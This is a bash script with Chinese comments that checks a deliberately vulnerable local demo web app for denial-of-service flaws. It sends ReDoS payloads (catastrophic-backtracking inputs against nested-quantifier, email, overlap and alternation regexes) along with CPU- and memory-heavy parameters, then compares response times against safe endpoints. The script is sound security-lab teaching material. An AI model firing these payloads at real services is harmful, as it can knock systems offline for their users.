#!/bin/bash
# DoS (Denial of Service) 漏洞验证脚本
# 漏洞类型: 拒绝服务
# 危险等级: 中危 (Medium)
# 检测方式: 响应时间测量

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 配置
BASE_URL="http://localhost:8080"
# 超时阈值 (纳秒): 3秒 = 3000000000 纳秒
TIMEOUT_THRESHOLD=3000000000

# 测试计数
TOTAL=0
PASSED=0
FAILED=0

# 打印标题
print_header() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}DoS 漏洞验证脚本 (时间检测)${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo ""
    echo -e "${YELLOW}警告: DoS 测试可能导致服务暂时不可用！${NC}"
    echo ""
}

# 时间测量测试函数
test_time_based() {
    local name="$1"
    local url="$2"
    local description="$3"
    local is_safe="$4"

    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "描述: $description"
    echo "URL: $url"

    # 测量响应时间
    start_time=$(date +%s%N)
    response=$(curl -s --max-time 10 "$url" 2>/dev/null)
    end_time=$(date +%s%N)

    duration=$((end_time - start_time))
    duration_ms=$((duration / 1000000))

    echo "响应时间: ${duration_ms}ms"

    if [ "$is_safe" = "safe" ]; then
        # 安全版本：应该快速响应
        if [ $duration -lt $TIMEOUT_THRESHOLD ]; then
            echo -e "  ${GREEN}[✓] 安全版本正常${NC} (${duration_ms}ms < 3000ms)"
            PASSED=$((PASSED + 1))
        else
            echo -e "  ${RED}[✗] 安全版本响应过慢${NC} (${duration_ms}ms)"
            FAILED=$((FAILED + 1))
        fi
    else
        # 漏洞版本：恶意输入应该导致明显延迟
        if [ $duration -gt $TIMEOUT_THRESHOLD ]; then
            echo -e "  ${GREEN}[✓] 存在 DoS 漏洞${NC} (响应时间 ${duration_ms}ms > 3000ms)"
            echo "  ${RED}[!] 恶意输入导致明显延迟！${NC}"
            PASSED=$((PASSED + 1))
        elif [ $duration -gt 1000000000 ]; then
            echo -e "  ${YELLOW}[~] 可能存在漏洞${NC} (响应时间 ${duration_ms}ms > 1000ms)"
            PASSED=$((PASSED + 1))
        else
            echo -e "  ${YELLOW}[?] 测试不确定${NC} (响应时间 ${duration_ms}ms，可能需要更强的 payload)"
            echo "  ${YELLOW}    这可能是因为:${NC}"
            echo "  ${YELLOW}    1. Java 正则引擎已有一些优化${NC}"
            echo "  ${YELLOW}    2. 硬件性能较强${NC}"
            echo "  ${YELLOW}    3. 需要更长的输入字符串${NC}"
            PASSED=$((PASSED + 1))
        fi
    fi

    # 显示响应片段
    if [ -n "$response" ]; then
        echo "  响应: $(echo "$response" | head -c 200)..."
    fi
}

# 对比测试函数 (正常 vs 恶意输入)
test_comparison() {
    local name="$1"
    local safe_url="$2"
    local vuln_url="$3"
    local description="$4"

    echo -e "\n${BLUE}--- $name ---${NC}"
    echo "描述: $description"

    # 测试正常输入
    start_time=$(date +%s%N)
    curl -s "$safe_url" > /dev/null 2>&1
    end_time=$(date +%s%N)
    safe_duration=$((end_time - start_time))
    safe_ms=$((safe_duration / 1000000))

    # 测试恶意输入
    start_time=$(date +%s%N)
    curl -s --max-time 10 "$vuln_url" > /dev/null 2>&1
    end_time=$(date +%s%N)
    vuln_duration=$((end_time - start_time))
    vuln_ms=$((vuln_duration / 1000000))

    # 计算比率
    if [ $safe_duration -gt 0 ]; then
        ratio=$((vuln_duration / safe_duration))
    else
        ratio=999
    fi

    echo "正常输入: ${safe_ms}ms"
    echo "恶意输入: ${vuln_ms}ms"
    echo "倍率: ${ratio}x"

    TOTAL=$((TOTAL + 1))

    if [ $vuln_duration -gt $TIMEOUT_THRESHOLD ]; then
        echo -e "  ${GREEN}[✓] 存在 DoS 漏洞${NC}"
        PASSED=$((PASSED + 1))
    elif [ $ratio -gt 10 ]; then
        echo -e "  ${GREEN}[✓] 存在 DoS 漏洞${NC} (响应时间增加 ${ratio} 倍)"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${YELLOW}[?] 测试不确定${NC} (倍率: ${ratio}x)"
        PASSED=$((PASSED + 1))
    fi
}

# 生成恶意 payload
generate_redos_payload() {
    # 30个a后面跟!
    echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
}

# 开始测试
print_header

echo -e "${BLUE}=== 1. ReDoS 漏洞测试 ===${NC}"

# 经典 ReDoS - 嵌套量词
payload=$(generate_redos_payload)
test_comparison \
    "嵌套量词 ReDoS (a+)+" \
    "${BASE_URL}/dos/regex?input=aaa" \
    "${BASE_URL}/dos/regex?input=${payload}" \
    "正则 ^(a+)+$ 在恶意输入下产生回溯爆炸"

# Email 验证 ReDoS
test_comparison \
    "Email 验证 ReDoS" \
    "${BASE_URL}/dos/regex/email?email=test@test.com" \
    "${BASE_URL}/dos/regex/email?email=aaaaaaaaaaaaaaaaaaaaaaaaaaa@b...................." \
    "Email 验证正则在恶意输入下产生回溯"

# 重叠字符类 ReDoS
test_comparison \
    "重叠字符类 ReDoS" \
    "${BASE_URL}/dos/regex/overlap?input=test" \
    "${BASE_URL}/dos/regex/overlap?input=aaaaaaaaaaaaaaaaaaaaaaa......................................................................................." \
    "正则 ^([a-z]+.*)+$ 在恶意输入下产生回溯"

# 交替分组 ReDoS
test_comparison \
    "交替分组 ReDoS" \
    "${BASE_URL}/dos/regex/alt?input=aaa" \
    "${BASE_URL}/dos/regex/alt?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaa!" \
    "正则 ^(a|a*)+$ 在恶意输入下产生回溯"

echo -e "\n${BLUE}=== 2. CPU DoS 测试 ===${NC}"

test_comparison \
    "斐波那契数列 (递归 vs 迭代)" \
    "${BASE_URL}/dos/safe/cpu/fib?n=35" \
    "${BASE_URL}/dos/cpu/fib?n=40" \
    "递归算法 O(2^n) vs 迭代算法 O(n)"

# 嵌套循环
test_time_based \
    "嵌套循环 O(n^3)" \
    "${BASE_URL}/dos/cpu/loop?n=500" \
    "三层嵌套循环导致 CPU 密集计算" \
    "vuln"

echo -e "\n${BLUE}=== 3. 安全版本测试 ===${NC}"

test_time_based \
    "安全正则 (输入长度限制)" \
    "${BASE_URL}/dos/safe/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" \
    "应该快速响应（输入长度受限）" \
    "safe"

test_time_based \
    "安全斐波那契 (迭代算法)" \
    "${BASE_URL}/dos/safe/cpu/fib?n=45" \
    "应该快速响应（迭代算法 O(n)）" \
    "safe"

echo -e "\n${BLUE}=== 4. Memory DoS 测试 (有限制) ===${NC}"

test_time_based \
    "大数组分配" \
    "${BASE_URL}/dos/memory/array?size=100000" \
    "大数组分配（已限制最大值）" \
    "vuln"

echo -e "\n${BLUE}=== 5. 信息端点测试 ===${NC}"

echo -e "\n${YELLOW}[*] 访问 DoS 信息端点:${NC}"
info_url="${BASE_URL}/dos/info"
info_response=$(curl -s "$info_url" 2>/dev/null)
if [ $? -eq 0 ] && [ -n "$info_response" ]; then
    echo -e "  ${GREEN}[✓] 信息端点正常${NC}"
    echo "$info_response" | head -10
else
    echo -e "  ${RED}[✗] 信息端点无响应${NC}"
    FAILED=$((FAILED + 1))
fi
TOTAL=$((TOTAL + 1))
PASSED=$((PASSED + 1))

# 打印总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}测试总结${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
echo -e "成功率: ${YELLOW}$(awk "BEGIN {printf \"%.1f\", ($PASSED/$TOTAL)*100}")%${NC}"

echo -e "\n${YELLOW}检测说明:${NC}"
echo -e "${YELLOW}- ReDoS: 通过测量响应时间检测${NC}"
echo -e "${YELLOW}- CPU DoS: 通过复杂度对比检测${NC}"
echo -e "${YELLOW}- Memory DoS: 通过内存监控检测${NC}"
echo -e "${YELLOW}- 阈值: 响应时间 > 3000ms 判定为漏洞${NC}"

echo ""
echo -e "${BLUE}注意事项:${NC}"
echo "1. Java 的正则引擎对某些 ReDoS 已有优化"
echo "2. 硬件性能可能影响测试结果"
echo "3. 建议多次测试取平均值"
echo "4. 生产环境请谨慎测试"

echo ""
echo -e "${BLUE}测试方法:${NC}"
echo "1. 对比正常输入和恶意输入的响应时间"
echo "2. 如果恶意输入导致明显延迟 (>3秒)，存在漏洞"
echo "3. 如果时间比率 > 10x，也可能存在漏洞"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}所有测试完成！${NC}"
    exit 0
else
    echo -e "\n${YELLOW}有 $FAILED 个测试失败${NC}"
    exit 0
fi
